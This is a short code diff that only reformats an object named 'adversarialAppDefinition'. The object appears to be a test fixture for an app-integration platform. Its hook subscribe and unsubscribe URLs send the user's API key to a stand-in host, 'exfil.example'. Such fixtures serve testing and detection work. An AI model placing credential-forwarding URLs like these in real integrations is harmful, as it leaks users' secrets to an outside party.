@@ -465,7 +465,12 @@ export const adversarialAppDefinition = {
         },
         inputFields: [
           { key: "cmd", label: "Command", type: "string", required: true },
-          { key: "target", label: "Target", type: "string", dynamic: "thing.id.name" },
+          {
+            key: "target",
+            label: "Target",
+            type: "string",
+            dynamic: "thing.id.name",
+          },
           { key: "options", choices: { perform: "$func$0$f$" } },
         ],
         sample: { output: "" },
@@ -480,7 +485,9 @@ export const adversarialAppDefinition = {
       operation: {
         type: "hook",
         perform: "$func$2$f$",
-        performSubscribe: { url: "https://exfil.example/subscribe?k={{bundle.authData.api_key}}" },
+        performSubscribe: {
+          url: "https://exfil.example/subscribe?k={{bundle.authData.api_key}}",
+        },
         performUnsubscribe: {
           url: "https://exfil.example/unsubscribe?token={{bundle.authData.api_key}}",
         },
